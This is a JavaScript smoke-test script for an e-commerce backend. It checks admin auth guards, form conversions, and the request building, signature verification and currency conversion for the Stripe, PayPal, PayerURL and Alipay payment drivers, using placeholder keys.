import handler from '../api/_routes/github-progress.mjs'
import usersHandler, { isBanned } from '../api/_routes/admin-users.mjs'
import {
  DRIVERS,
  ALIPAY_GATEWAY,
  alipayBytes,
  alipayCharge,
  alipayCheckoutUrl,
  alipayFx,
  alipayOrderId,
  alipayOutTradeNo,
  alipayPem,
  alipayProduct,
  alipayRate,
  alipayRequestParams,
  alipaySign,
  alipaySignContent,
  alipayTimestamp,
  approvalLink,
  decimalAmount,
  driverFor,
  orderUrl,
  payerurlAuth,
  payerurlPaymentArgs,
  payerurlQuery,
  payerurlSign,
  payerurlSignedFields,
  paypalOrderBody,
  stripeSessionForm
} from '../api/_lib/payments.mjs'
import {
  SCHEMA,
  defaultRecord,
  fieldHint,
  fromForm,
  rowMeta,
  toForm,
  toLocalInput
} from '../docs/.vitepress/theme/recordForm.ts'
import { preloadMarkdown, renderMarkdown, renderMarkdownInline } from '../docs/.vitepress/theme/markdown.ts'
import cancelHandler, { cancelPendingOrder } from '../api/_routes/cancel-order.mjs'
import { orderPath } from '../docs/.vitepress/theme/routes.ts'
import telemetryHandler from '../api/_routes/telemetry.mjs'
import {
  exportOrders, listOrders, maskEmail, orderDetail, toCsv, updateOrderStatus
} from '../api/_routes/admin-orders.mjs'
import {
  actionsFor, boardCounts, executeBlock, exportRefundAudit, listRefunds, refundDetail, repairRefund
} from '../api/_routes/admin-refunds.mjs'
import { couponFieldsFor, redeemOrRollback } from '../api/_lib/coupons.mjs'
import { quoteCoupon } from '../api/_routes/coupon.mjs'
import { NEVER_WRITABLE, forValidation } from '../api/_routes/admin-coupons.mjs'
import {
  LICENSE_STATUS,
  RUNNING_WINDOW_MS,
  mergeSample,
  parseSample,
  summarise
} from '../api/_lib/telemetry.mjs'
import { readFileSync } from 'node:fs'
import nodeCrypto from 'node:crypto'
import {
  EDITOR_GROUPS,
  GROUP_LABEL,
  GROUP_ORDER,
  GROUP_RANK,
  RANK,
  isEditor,
  rankOf
} from '../shared/groups.mjs'
import {
  ACTION_TYPES,
  AMOUNT_OPERATORS,
  CONDITION_TYPES,
  SKU_OPERATORS,
  ZERO_DECIMAL_CURRENCIES,
  applyActions,
  checkAvailability,
  describeAction,
  describeCondition,
  evaluateCondition,
  evaluateConditions,
  formatMinor,
  quote,
  validateAction,
  validateCondition,
  validateCoupon
} from '../shared/coupons.mjs'
// 两个模块都有 ACTION_TYPES 和 validateAction，含义完全不同（券的动作是改金额，站内信的动作是按钮），
// 所以在这里起别名而不是在任一模块里改名——改名会让各自文件里的命名变得别扭。
import {
  ACTION_ENDPOINT,
  ADMIN_ONLY_ACTIONS,
  ACTION_TYPES as NOTIF_ACTION_TYPES,
  KIND_LABEL,
  NOTIFICATION_KINDS,
  NOTIFICATION_SCOPES,
  NOTIFICATION_SCOPE_RANK,
  broadcastScopesFor,
  canSeeNotification,
  canUseAction,
  needsConfirm,
  needsReason,
  orderHref,
  presentationFor,
  refundApprovalNotification,
  refundDoneNotification,
  refundEscalationNotification,
  validateAction as validateNotifAction,
  validateNotification
} from '../shared/notifications.mjs'
import {
  ORDER_STATUSES,
  ORDER_STATUS_LABEL,
  ORDER_TRANSITIONS,
  REFUND_APPROVER_GROUPS,
  REFUND_INITIATOR_ROLES,
  REFUND_PROXY_GROUPS,
  REFUND_STATUSES,
  REFUND_STATUS_LABEL,
  REFUND_TRANSITIONS,
  TERMINAL_ORDER_STATUSES,
  assertRefundTransition,
  assertTransition,
  canRefundTransition,
  canRequestRefund,
  canTransition,
  rejectionLogEntry,
  transitionLabel,
  validateRefundAmount
} from '../shared/orders.mjs'
import {
  insertNotification,
  logOrderStatus,
  logRefundAction,
  logSessionEvent,
  notifyUser,
  setting,
  settleApproval
} from '../api/_lib/notify.mjs'
import { orderNoOf, requestRefund } from '../api/_routes/refund-request.mjs'
import { approveRefund } from '../api/_routes/refund-approve.mjs'
import { rejectRefund } from '../api/_routes/refund-reject.mjs'
import { transferRefund } from '../api/_routes/refund-transfer.mjs'
import { executeRefund } from '../api/_routes/refund-execute.mjs'
import {
  archiveNotifications, inboxSettings, listNotifications, markRead, unreadCount
} from '../api/_routes/notifications.mjs'
// 从 server.mjs 转发出来的同一份表：断言转发没断，因为大部分调用方是从这里 import 的。
import { GROUP_RANK as API_RANK, requireUser } from '../api/_lib/server.mjs'
import syncHandler, { loginOf, resolveGroup } from '../api/_routes/sync-github-groups.mjs'
// §2/§3/§4 客服。全部起 sx 前缀的别名：这个文件是一个平铺作用域，284 个顶层声明里已经有
// markRead（站内信那个）、csRow、csBlocked，同名会是一句 SyntaxError 而不是一次失败的断言。
import {
  ADMIN_MODES as sxAdminModes, CHANNELS as sxChannels, DEFAULT_ADMIN_MODE as sxDefaultMode,
  MESSAGE_FORMATS as sxFormats, RATING_RANGE as sxRatingRange,
  attachmentKindOf as sxKindOf, attachmentPath as sxAttachPath,
  checkAttachmentSize as sxSize, dispatchPriority as sxDispatch, isHeartbeatStale as sxStale,
  isSessionIdle as sxIdle, matchesKeyword as sxMatch, normalizeAttachments as sxAttach,
  normalizeRating as sxNormalizeRating,
  pickAgent as sxPick, pickAutoReply as sxPickReply, prepareMessage as sxPrepare,
  presentMessage as sxPresent, sanitizeHtml as sxClean, servesChannel as sxServes,
  sessionCapabilities as sxCaps, sessionMetrics as sxSessionMetrics,
  timeoutTextKeys as sxTimeoutKeys, uploadLimits as sxLimits,
  validateRule as sxSharedValidateRule
} from '../shared/cs.mjs'
import {
  CS_SETTING_KEYS as SX_SETTING_KEYS, clientConfig as sxClientConfig,
  sessionTouchFor as sxTouch, verifyAttachments as sxVerify
} from '../api/_lib/cs.mjs'
import {
  claimSession as sxClaimSession, closeSession as sxCloseSession, openSession as sxOpenSession,
  rateSession as sxRateSession, reopenSession as sxReopenSession,
  setAdminMode as sxSetAdminMode, setPresence as sxSetPresence,
  sweepIdleSessions as sxSweep
} from '../api/_routes/cs-session.mjs'
import {
  composerConfig as sxComposerConfig, editMessage as sxEditMessage,
  listMessages as sxListMessages, markRead as sxMarkRead, recallMessage as sxRecallMessage,
  sendMessage as sxSendMessage, typingGate as sxTypingGate
} from '../api/_routes/cs-message.mjs'
import {
  chatCouponCode as sxCouponCode, listSessionOrders as sxSessionOrders,
  sendCoupon as sxSendCoupon, startRefund as sxStartRefund
} from '../api/_routes/cs-actions.mjs'
import {
  dashboard as sxDashboard, listAgents as sxListAgents, listAll as sxListAll,
  listMine as sxListMine, listQueue as sxListQueue
} from '../api/_routes/cs-workbench.mjs'
import {
  NEVER_WRITABLE as SX_RULE_NEVER, createRule as sxCreateRule, deleteRule as sxDeleteRule,
  listRules as sxListRules, updateRule as sxUpdateRule, validateRule as sxValidateRule
} from '../api/_routes/admin-auto-replies.mjs'

const originalRepository = process.env.GITHUB_REPOSITORY
const originalToken = process.env.GITHUB_TOKEN
delete process.env.GITHUB_REPOSITORY
delete process.env.GITHUB_TOKEN

let statusCode = 0
let body = null
const response = {
  status(code) { statusCode = code },
  setHeader() {},
  send(value) { body = JSON.parse(value) }
}

await handler({}, response)

if (statusCode !== 200 || body?.configured !== false) {
  throw new Error('Unconfigured GitHub endpoint must return a safe 200 fallback')
}

if (originalRepository) process.env.GITHUB_REPOSITORY = originalRepository
if (originalToken) process.env.GITHUB_TOKEN = originalToken

console.log('GitHub progress API fallback: OK')

let userStatus = 0
let userBody = null
const userResponse = {
  status(code) { userStatus = code },
  setHeader() {},
  send(value) { userBody = JSON.parse(value) }
}

await usersHandler({ method: 'GET', headers: {} }, userResponse)

if (userStatus !== 401 || !userBody?.error) {
  throw new Error('User management endpoint must reject unauthenticated requests')
}

console.log('Admin users API auth guard: OK')

const hour = 3600 * 1000
const banCases = [
  [null, false],
  [undefined, false],
  ['infinity', true],
  [new Date(Date.now() + hour).toISOString(), true],
  [new Date(Date.now() - hour).toISOString(), false]
]

for (const [value, expected] of banCases) {
  if (isBanned(value) !== expected) {
    throw new Error(`banned_until ${String(value)} must read as ${expected ? 'banned' : 'active'}`)
  }
}

console.log('Ban state derivation: OK')

// The /admin editor only counts as "ordinary fields" if these conversions are lossless: a DB row
// must survive row -> inputs -> upsert payload without changing type or losing columns.
const assert = (ok, what) => { if (!ok) throw new Error(what) }

const postRow = {
  id: '11111111-2222-3333-4444-555555555555',
  created_at: '2026-01-01T00:00:00.000Z',
  kind: 'news',
  status: 'published',
  title: '标题',
  slug: 'release-0-1-0',
  cover_url: null,
  tags: ['anticheat', 'release'],
  published_at: '2026-08-28T10:30:00.000Z',
  featured: true,
  summary: '摘要',
  body: '# 正文'
}

const postDraft = toForm(SCHEMA.posts, postRow)
assert(postDraft.tags === 'anticheat, release', 'text[] must render as comma-separated text')
assert(postDraft.cover_url === '', 'a null text column must render as an empty input, not the string "null"')
assert(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}$/.test(postDraft.published_at), 'timestamptz must render as datetime-local')
assert(postDraft.featured === true, 'boolean must stay boolean so the checkbox binds')

const postPayload = fromForm(SCHEMA.posts, postDraft)
assert(Array.isArray(postPayload.tags) && postPayload.tags.length === 2, 'comma text must convert back to text[]')
assert(postPayload.cover_url === null, 'a blank nullable column must be written as null, never as ""')
assert(postPayload.published_at === postRow.published_at, `published_at must survive the round trip, got ${postPayload.published_at}`)
assert(
  postPayload.id === postRow.id && postPayload.created_at === postRow.created_at,
  'columns without a field must pass through, otherwise upsert inserts a duplicate instead of updating'
)

const blankDate = fromForm(SCHEMA.posts, { ...postDraft, published_at: '' })
assert(!('published_at' in blankDate), 'a blank datetime must drop the key so the not-null default now() applies')
assert(toLocalInput(null) === '' && toLocalInput('not a date') === '', 'an unparseable timestamp must leave the datetime input empty')

const artifactRow = {
  sku: 'AETHER-STARTER',
  name: '入门版',
  description: '',
  price_minor: 1999,
  currency: 'USD',
  active: true,
  metadata: { seats: 1 }
}

const artifactDraft = toForm(SCHEMA.artifacts, artifactRow)
assert(artifactDraft.metadata === JSON.stringify({ seats: 1 }, null, 2), 'jsonb must render as pretty JSON')
assert(artifactDraft.price_minor === 1999, 'integer columns must stay numbers')
assert(toForm(SCHEMA.artifacts, { metadata: null }).metadata === '{}', 'a null jsonb column must render as {} rather than "null"')

const artifactPayload = fromForm(SCHEMA.artifacts, artifactDraft)
assert(artifactPayload.metadata.seats === 1, 'pretty JSON must parse back into a jsonb object')
assert(artifactPayload.price_minor === 1999, 'the number input must not stringify the price')

let jsonError = null
try { fromForm(SCHEMA.artifacts, { ...artifactDraft, metadata: '{oops' }) } catch (error) { jsonError = error }
assert(jsonError?.message?.includes('附加元数据'), 'a JSON parse failure must name the field it came from')

const providerDraft = toForm(SCHEMA.payment_providers, defaultRecord('payment_providers'))
providerDraft.secret_env_names = ' ALIPAY_KEY , , ALIPAY_SECRET '
const providerPayload = fromForm(SCHEMA.payment_providers, providerDraft)
assert(providerPayload.secret_env_names.join('|') === 'ALIPAY_KEY|ALIPAY_SECRET', 'tag input must trim entries and drop empty ones')

const pkField = SCHEMA.payment_providers.find((f) => f.key === 'id')
assert(fieldHint(pkField, providerDraft, false).includes('主键不可修改'), 'editing an existing primary key must be warned about, since upsert would insert a new row')
assert(fieldHint(pkField, providerDraft, true) === pkField.hint, 'a brand-new record must still explain what the primary key does')
assert(fieldHint(SCHEMA.artifacts.find((f) => f.key === 'price_minor'), artifactDraft, false).includes('19.99 USD'), 'the price hint must show the human-readable amount')

assert(rowMeta('posts', postRow) === 'news · published · release-0-1-0', 'post rows must be identifiable in the list')
assert(rowMeta('artifacts', artifactRow) === 'AETHER-STARTER · 19.99 USD', 'artifact rows must show the formatted price')
assert(rowMeta('progress_entries', { stage: '00', status: 'active', percent: 40 }) === '阶段 00 · active · 40%', 'progress rows must show stage and percent')

for (const table of Object.keys(SCHEMA)) {
  const payload = fromForm(SCHEMA[table], toForm(SCHEMA[table], defaultRecord(table)))
  for (const field of SCHEMA[table]) {
    if (field.type === 'datetime') continue
    assert(field.key in payload, `${table}.${field.key} must be present in the payload built from its default record`)
  }
  // Every input must explain itself: an unlabelled box is the thing this editor exists to remove.
  for (const field of SCHEMA[table]) {
    assert(typeof field.hint === 'string' && field.hint.length >= 8, `${table}.${field.key} needs a hint describing what the value does`)
    assert(fieldHint(field, payload, true), `${table}.${field.key} must render a description under the input`)
  }
}

console.log('Record form conversions: OK')

// The three built-in drivers post shapes the generic create_url path cannot express, so the request
// bodies are asserted directly: a wrong key name here is a payment that silently never happens.
const order = {
  id: 'a1b2c3d4-0000-4000-8000-000000000001',
  sku: 'AETHER-STARTER',
  quantity: 1,
  amount_minor: 1999,
  currency: 'USD'
}
const artifact = { name: '入门版', description: '单机授权' }
const site = 'https://aetherac.abnt.it'

// The order route. VitePress resolves routes against a build-time hash map of its .md files, so an id in
// the path — `/order/<uuid>` — has no entry and the client router replaces the page with its own 404 the
// instant JS boots. That is what buyers hit returning from a completed payment: a 404 over money already
// paid. A server rewrite cannot fix it, because it only corrects the HTML that the router then throws
// away. These assertions pin the query form on both halves, and pin them to each other: the browser
// builds the link, payments.mjs builds the providers' return_url, and a fix applied to one only is the
// exact way this breaks again.
assert(orderPath('abc') === '/order?order_id=abc', 'the id must be a query parameter — as a path segment the client router 404s')
assert(!/\/order\/[^?]/.test(orderUrl(site, 'abc')), 'the id must never appear as a path segment')
assert(orderUrl(site, 'abc') === site + orderPath('abc'), 'client and server must build the same order URL')
assert(orderUrl(site, 'abc', true) === `${site}/order?order_id=abc&paid=1`, 'the paid flag is what starts the callback poll, so it must survive')
assert(orderPath('a b&c=d') === '/order?order_id=a%20b%26c%3Dd' && orderUrl(site, 'a b&c=d') === site + orderPath('a b&c=d'),
  'an id is encoded, so a stray & cannot inject another parameter')

const stripeForm = stripeSessionForm(order, artifact, site)
assert(stripeForm instanceof URLSearchParams, 'Stripe only accepts application/x-www-form-urlencoded')
assert(stripeForm.get('line_items[0][price_data][unit_amount]') === '1999', 'unit_amount must stay the minor unit the artifacts table stores')
assert(stripeForm.get('line_items[0][price_data][currency]') === 'usd', 'Stripe rejects an upper-case currency')
assert(stripeForm.get('line_items[0][price_data][product_data][name]') === '入门版', 'the buyer must see the artifact name, not the SKU')
assert(stripeForm.get('client_reference_id') === order.id && stripeForm.get('metadata[order_id]') === order.id, 'the callback finds our order through client_reference_id / metadata')
assert(stripeForm.get('success_url') === `${site}/order?order_id=${order.id}&paid=1`, 'success_url must return to the order page')
assert(!stripeSessionForm(order, { name: 'x', description: '' }, site).has('line_items[0][price_data][product_data][description]'), 'Stripe rejects an empty description, so a blank one must be omitted')
assert(stripeSessionForm(order, null, site).get('line_items[0][price_data][product_data][name]') === order.sku, 'a missing artifact must fall back to the SKU rather than sending "undefined"')

const paypalBody = paypalOrderBody(order, artifact, site)
assert(paypalBody.intent === 'CAPTURE', 'the order must be capturable, otherwise the money never moves')
assert(paypalBody.purchase_units[0].amount.value === '19.99', 'PayPal wants a decimal string, not the minor unit')
assert(paypalBody.purchase_units[0].amount.currency_code === 'USD', 'PayPal rejects a lower-case currency code')
assert(paypalBody.purchase_units[0].custom_id === order.id, 'custom_id is how the webhook maps a PayPal order back to ours')
assert(paypalBody.payment_source.paypal.experience_context.return_url === `${site}/order?order_id=${order.id}&paid=1`, 'the buyer must land back on the order page')

assert(decimalAmount(1999, 'USD') === '19.99', 'two-decimal currencies divide by 100')
assert(decimalAmount(1999, 'JPY') === '1999', 'JPY is already whole; dividing it would undercharge by 100x')
assert(decimalAmount(1999, 'jpy') === '1999', 'the zero-decimal check must not depend on letter case')
assert(decimalAmount(0, 'USD') === '0.00', 'a free artifact must still form a valid amount')

assert(approvalLink([{ rel: 'self', href: 'a' }, { rel: 'payer-action', href: 'b' }]) === 'b', 'the buyer is sent to the payer-action link')
assert(approvalLink([{ rel: 'approve', href: 'c' }]) === 'c', 'older PayPal responses name that link approve')
assert(approvalLink([{ rel: 'self', href: 'a' }]) === null && approvalLink(undefined) === null, 'a missing approval link must be detectable, not returned as undefined')

// PayerURL signs a canonical copy of the parameters rather than the bytes on the wire. Every string
// below was produced by running the official SDK's own buildQueryString over the same input
// (binance-crypto-instant-payout-nodejs@1.0.0, dist/index.js) and pasting what it returned. They are
// pinned rather than derived so that drifting from the SDK fails the build instead of a live payment.
assert(payerurlQuery({ b: '1', a: '2' }) === 'a=2&b=1', 'only the top-level keys are sorted before signing')
assert(payerurlQuery({ items: [{ name: 'x', qty: 1 }] }) === 'items%5B0%5D%5Bname%5D=x&items%5B0%5D%5Bqty%5D=1', 'nested items become bracketed keys and keep their own order')
assert(payerurlQuery({ a: 'x y' }) === 'a=x+y', 'a space is folded to + rather than left as %20')
assert(payerurlQuery({ a: "~!*'()" }) === "a=~!*'()", 'encodeURIComponent leaves these alone — escaping them like PHP urlencode() would break the digest')
assert(payerurlQuery({ a: '1', b: null, c: undefined }) === 'a=1', 'null and undefined are dropped instead of sent empty')
assert(payerurlQuery({ a: '入门版' }) === 'a=%E5%85%A5%E9%97%A8%E7%89%88', 'a non-ASCII value is UTF-8 percent-encoded')

const payerurlArgs = payerurlPaymentArgs({ order, artifact: { name: '入门版 Starter' }, siteUrl: site, user: { email: 'buyer@example.com' } })
assert(payerurlArgs.order_id === order.id, 'the callback maps back to our order through order_id')
// Measured against the live checkout, not taken from the SDK README: sending the minor unit here
// billed a 20.00 USD order as 2000 USD. The README says "smallest unit" and is wrong about its own
// server, so this asserts what the server actually charges.
assert(payerurlArgs.amount === '19.99', 'amount is a decimal — the minor unit here overcharges by 100x')
assert(payerurlArgs.currency === 'usd', 'PayerURL lower-cases the currency')
assert(payerurlArgs.items[0].price === '19.99', "an item's price is a decimal too, and must agree with the total")
assert(
  payerurlPaymentArgs({ order: { ...order, amount_minor: 1999, currency: 'JPY' }, artifact, siteUrl: site, user: {} }).amount === '1999',
  'a zero-decimal currency must not be divided by 100'
)
assert(
  payerurlPaymentArgs({ order: { ...order, amount_minor: 2000, quantity: 3 }, artifact, siteUrl: site, user: {} }).items[0].price === '6.67',
  'a per-unit price that does not divide evenly must still be a valid decimal'
)
assert(payerurlArgs.items[0].name === '入门版_Starter', 'a space in an item name becomes an underscore')
assert(payerurlArgs.type === 'nodejs', 'the SDK identifies itself as nodejs')
// The whole request, byte for byte as the SDK builds it.
assert(
  payerurlQuery(payerurlArgs) === 'amount=19.99&billing_email=buyer%40example.com&billing_fname=buyer&billing_lname=buyer'
    + '&cancel_url=https%3A%2F%2Faetherac.abnt.it%2Forder%3Forder_id%3Da1b2c3d4-0000-4000-8000-000000000001&currency=usd'
    + '&items%5B0%5D%5Bname%5D=%E5%85%A5%E9%97%A8%E7%89%88_Starter&items%5B0%5D%5Bqty%5D=1&items%5B0%5D%5Bprice%5D=19.99'
    + '&notify_url=https%3A%2F%2Faetherac.abnt.it%2Fv1%2Fcallback%2Fpayerurl&order_id=a1b2c3d4-0000-4000-8000-000000000001'
    + '&redirect_to=https%3A%2F%2Faetherac.abnt.it%2Forder%3Forder_id%3Da1b2c3d4-0000-4000-8000-000000000001%26paid%3D1&type=nodejs',
  'the signed payment request must match the SDK byte for byte'
)
assert(payerurlArgs.notify_url === `${site}/v1/callback/payerurl`, 'the callback must reach our own endpoint')
assert(payerurlArgs.billing_email === 'buyer@example.com' && payerurlArgs.billing_fname && payerurlArgs.billing_lname, 'PayerURL refuses an order without a complete billing identity')

process.env.PAYERURL_PUBLIC_KEY = 'pk_smoke_public'
process.env.PAYERURL_SECRET_KEY = 'sk_smoke_secret'
// A callback is signed over the ten-field whitelist only, so the test signs the same way the merchant
// server does rather than over the whole body.
const sign = (data) => payerurlAuth(payerurlSignedFields(data), process.env.PAYERURL_PUBLIC_KEY, process.env.PAYERURL_SECRET_KEY)
const callback = {
  order_id: order.id,
  transaction_id: 'tx_smoke_1',
  status_code: '200',
  note: 'ok note',
  confirm_rcv_amnt: '19.99',
  confirm_rcv_amnt_curr: 'USD',
  coin_rcv_amnt: '19.99',
  coin_rcv_amnt_curr: 'USDT',
  txn_time: '2026-08-29 10:00:00',
  // Not in the whitelist: present to prove it is excluded from the digest.
  status: 'paid'
}
const signed = sign(callback)

// Pinned from the SDK's own signPayload over the same whitelist with the same key.
assert(
  payerurlSign(payerurlSignedFields(callback), 'sk_smoke_secret') === '20357731ad2f22022486f0a66d6ba9dbd774ec87b305601a90a64fbbe3e11a3a',
  'the callback digest must match the one the SDK computes'
)

const viaBody = await DRIVERS.payerurl.verify({ payload: { ...callback, authStr: signed }, headers: {}, config: {} })
assert(viaBody.paid === true && viaBody.orderId === order.id, 'a correctly signed callback in the authStr field must be accepted')
assert(viaBody.expect.amountMinor === 1999, 'the received amount is compared against the order in minor units')
assert(viaBody.expect.currency === null, 'no currency is claimed: confirm_rcv_amnt_curr may be a coin ticker, and guessing would 409 a real payment')
assert(viaBody.response.status === 2040, "a settled callback is answered with PayerURL's own success code")
const viaHeader = await DRIVERS.payerurl.verify({ payload: callback, headers: { authorization: `Bearer ${signed}` }, config: {} })
assert(viaHeader.paid === true, 'the same token in the Authorization header must verify identically')
// authStr transports the token being checked, so it cannot be part of what was signed.
assert((await DRIVERS.payerurl.verify({ payload: { ...callback, authStr: signed }, headers: { authorization: `Bearer ${signed}` }, config: {} })).paid === true, 'the token must verify whether it arrives in the header, the body, or both')
const unlisted = await DRIVERS.payerurl.verify({ payload: { ...callback, status: 'anything', extra_field: 'added later', authStr: signed }, headers: {}, config: {} })
assert(unlisted.paid === true, 'a field outside the ten signed ones must not enter the digest, or a new PayerURL field would break every callback')
const tampered = await DRIVERS.payerurl.verify({ payload: { ...callback, confirm_rcv_amnt: '0.01', authStr: signed }, headers: {}, config: {} })
assert(tampered.reject?.status === 401 && tampered.reject.response.status === 2030, 'editing any signed field must fail the digest, not lower the price')
const unsigned = await DRIVERS.payerurl.verify({ payload: callback, headers: {}, config: {} })
assert(unsigned.reject?.status === 401 && unsigned.reject.response.status === 2030, 'a callback carrying no token at all must be refused')
const foreignKey = await DRIVERS.payerurl.verify({ payload: { ...callback, authStr: payerurlAuth(payerurlSignedFields(callback), 'pk_someone_else', 'sk_smoke_secret') }, headers: {}, config: {} })
assert(foreignKey.reject?.status === 401, "another merchant's public key must be refused even when the digest itself is well formed")
// status_code is one of the signed fields, so it can only be read after the signature has been checked.
const settling = { ...callback, status_code: '100' }
const unsettled = await DRIVERS.payerurl.verify({ payload: { ...settling, authStr: sign(settling) }, headers: {}, config: {} })
assert(unsettled.paid === false && unsettled.failed === false, 'a crypto payment still confirming must stay pending, not be guessed as failed')
assert(unsettled.response.status === 2050, 'an unsettled callback is answered with 2050, the code the SDK uses for "Order not complete"')
const cancelled = { ...callback, status_code: '20000' }
const abandoned = await DRIVERS.payerurl.verify({ payload: { ...cancelled, authStr: sign(cancelled) }, headers: {}, config: {} })
assert(abandoned.failed === true && abandoned.paid === false && abandoned.response.status === 20000, 'a cancelled order must be marked failed rather than left pending forever')
const noTxn = { ...callback, transaction_id: '' }
const missingTxn = await DRIVERS.payerurl.verify({ payload: { ...noTxn, authStr: sign(noTxn) }, headers: {}, config: {} })
assert(missingTxn.reject?.response.status === 2050, 'a callback without a transaction id cannot be reconciled and must be refused')

// 支付宝。开放平台的沙箱没法在 CI 里跑，所以钉住的是「待签名串」和参数拼装——签名本身用一对临时密钥
// 往返验证。待签名串错一个字符的后果不是报错：请求那头是网关回一句 Invalid signature，通知那头是每一笔
// 付款都验不过、订单永远停在待支付。
process.env.ALIPAY_APP_ID = '2021000000000001'
const alipayKeys = nodeCrypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
})
process.env.ALIPAY_PRIVATE_KEY = alipayKeys.privateKey
process.env.ALIPAY_PUBLIC_KEY = alipayKeys.publicKey

assert(alipayPem('QUFB', 'public').startsWith('-----BEGIN PUBLIC KEY-----\nQUFB'), 'the key tool hands out bare base64, and Node crypto only accepts PEM')
assert(alipayPem(alipayKeys.publicKey, 'public') === alipayKeys.publicKey.trim(), 'a key that already carries PEM headers must be used verbatim')
assert(alipayPem('-----BEGIN PUBLIC KEY-----\\nQUFB\\n-----END PUBLIC KEY-----', 'public').split('\n').length === 3,
  'an env var stores newlines as literal \\n, and a key with those left in place fails to parse')

// 网关只接受与自己相差一小时以内的时间戳，而函数不在 Asia/Shanghai 跑。
assert(alipayTimestamp(new Date('2026-08-30T01:02:03Z')) === '2026-08-30 09:02:03', 'timestamp is GMT+8, computed rather than read from the local clock')

assert(alipaySignContent({ b: '2', a: '1', sign: 'x', blank: '', missing: null }) === 'a=1&b=2', 'the sign content sorts keys and drops sign, empty strings and nulls')
assert(alipaySignContent({ sign_type: 'RSA2', a: '1' }) === 'a=1&sign_type=RSA2', 'a request signs sign_type as well')
assert(alipaySignContent({ sign_type: 'RSA2', a: '1' }, ['sign', 'sign_type']) === 'a=1',
  'an async notify excludes sign_type — getting these two rules backwards makes every callback fail to verify')
assert(alipaySignContent({ subject: '入门版 Starter' }) === 'subject=入门版 Starter', 'the sign content is not URL-encoded; encoding it would break every signature')

assert(alipayOutTradeNo(order.id) === 'a1b2c3d4000040008000000000000001' && !alipayOutTradeNo(order.id).includes('-'),
  'out_trade_no accepts only letters, digits and underscores, so the UUID hyphens must go')
assert(alipayOrderId(alipayOutTradeNo(order.id)) === order.id, 'the mapping must be reversible, or a paid callback cannot find its order')
assert(alipayOrderId('LEGACY_REF_1') === 'LEGACY_REF_1' && alipayOrderId('') === null, 'anything that is not 32 hex digits passes through instead of becoming null')

// 换算过的订单把「原币_原币金额_人民币金额」锁在单号尾部，因为 verify 只拿到通知正文，拿不到订单行。
const fxRef = alipayOutTradeNo(order.id, { currency: 'USD', amountMinor: 1999, cnyMinor: 14294 })
assert(fxRef === 'a1b2c3d4000040008000000000000001_USD_1999_14294' && fxRef.length <= 64 && /^[A-Za-z0-9_]+$/.test(fxRef),
  'the locked rate rides in out_trade_no, and it must still be letters/digits/underscore inside 64 bytes')
assert(alipayOrderId(fxRef) === order.id, 'the suffix must not stop a paid callback from finding its order')
assert(alipayFx(fxRef).cnyMinor === 14294 && alipayFx(fxRef).currency === 'USD' && alipayFx(fxRef).amountMinor === 1999,
  'the three segments must come back exactly, or a converted payment cannot be checked against the order')
assert(alipayFx(alipayOutTradeNo(order.id)) === null && alipayFx('LEGACY_REF_1') === null && alipayFx('x_usd_1_2') === null,
  'a CNY order carries no conversion, and a malformed suffix must read as none rather than as a made-up rate')

assert(alipayBytes('入门版专业版', 9) === '入门版', 'subject is capped in bytes, and a half-cut character would garble the cashier title')
assert(alipayBytes('abc', 9) === 'abc', 'a short subject is left alone')

const cnyOrder = { ...order, currency: 'CNY' }
assert(alipayCharge(cnyOrder).total === '19.99' && alipayCharge(cnyOrder).fx === null, 'total_amount is yuan, not the minor unit, and a CNY order needs no conversion')
// 支付宝国内商户结算的是人民币，所以非人民币订单按汇率折成人民币再发出去。分位向上取整：向下取整会让每
// 一笔换算订单少收最多一分，而那一分回来就是一个 409。
const usdCharge = alipayCharge(order, 7.1503)
assert(usdCharge.total === '142.94' && usdCharge.fx.cnyMinor === 14294 && usdCharge.fx.currency === 'USD' && usdCharge.fx.amountMinor === 1999,
  'a USD order is converted at the rate rather than charged the same number in yuan — that would be a silent 86% undercharge that never errors')
assert(Math.floor(usdCharge.fx.amountMinor * (usdCharge.fx.cnyMinor - 1) / usdCharge.fx.cnyMinor) < 1999,
  'one fen short must fold back to below the order amount, or payment-callback would release an underpaid order')
let alipayThrew = false
try { alipayCharge(order, 0) } catch { alipayThrew = true }
assert(alipayThrew, 'with no rate the order must not go out at all; charging 1:1 is the failure this conversion exists to prevent')

// 汇率来源：钉死的优先且不联网，否则查接口并缓存，查不到就抛而不是回落到 1。
const fxCalls = []
const fxStub = async (url) => { fxCalls.push(url); return { rates: { CNY: 7.2 } } }
assert(await alipayRate('CNY', {}, { fetchJson: fxStub }) === 1 && fxCalls.length === 0, 'a CNY order must never touch the rate feed')
assert(await alipayRate('USD', { fx_rates: { USD: 7.1 } }, { fetchJson: fxStub }) === 7.1 && fxCalls.length === 0,
  'public_config.fx_rates pins the rate without a network call, so a third-party outage cannot block checkout')
assert(Math.abs(await alipayRate('USD', { fx_rates: { USD: 7.1 }, fx_markup: 0.02 }, { fetchJson: fxStub }) - 7.242) < 1e-9,
  'fx_markup adds the spread on top of the mid-market rate')
assert(await alipayRate('SEK', {}, { fetchJson: fxStub }) === 7.2 && fxCalls[0].includes('from=SEK&to=CNY'), 'the feed is asked for the order currency against CNY')
assert(await alipayRate('SEK', {}, { fetchJson: fxStub }) === 7.2 && fxCalls.length === 1, 'the rate is cached inside the instance rather than fetched on every checkout')
let fxThrew = false
try { await alipayRate('ZWL', {}, { fetchJson: async () => ({ rates: {} }) }) } catch { fxThrew = true }
assert(fxThrew, 'a currency the feed does not quote must throw; falling back to 1 turns "no rate" into "charge 1:1"')

assert(alipayProduct({}, {}).method === 'alipay.trade.page.pay', 'a desktop browser gets 电脑网站支付')
assert(alipayProduct({}, { 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)' }).method === 'alipay.trade.wap.pay',
  'a phone gets 手机网站支付; page.pay there is a shrunken desktop cashier that cannot open the app')
assert(alipayProduct({ product: 'wap' }, {}).method === 'alipay.trade.wap.pay', 'public_config.product must be able to pin the choice')

const alipayParams = alipayRequestParams({ order: cnyOrder, artifact, siteUrl: site, now: new Date('2026-08-30T01:02:03Z') })
assert(alipayParams.version === '1.0' && alipayParams.format === 'JSON' && alipayParams.charset === 'utf-8' && alipayParams.sign_type === 'RSA2',
  'the v1.0 gateway rejects a request missing any one of the common parameters')
assert(alipayParams.notify_url === `${site}/v1/callback/alipay`, 'the notify must reach our own endpoint')
